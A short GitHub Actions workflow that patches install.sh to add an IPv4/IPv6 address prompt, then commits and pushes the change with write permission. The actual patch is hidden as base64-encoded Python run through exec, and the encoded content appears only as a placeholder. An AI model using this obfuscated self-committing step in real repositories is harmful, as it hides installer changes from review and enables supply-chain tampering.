name: Apply IPv4 and IPv6 selector

on:
  push:
    paths:
      - .github/workflows/apply-ip-selector.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Patch installer
        shell: bash
        run: |
          python3 -c "import base64; exec(base64.b64decode('<SECRET>PY'));"
          bash -n install.sh
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add install.sh
          git commit -m "Add selectable IPv4 and IPv6 address prompt"
          git push
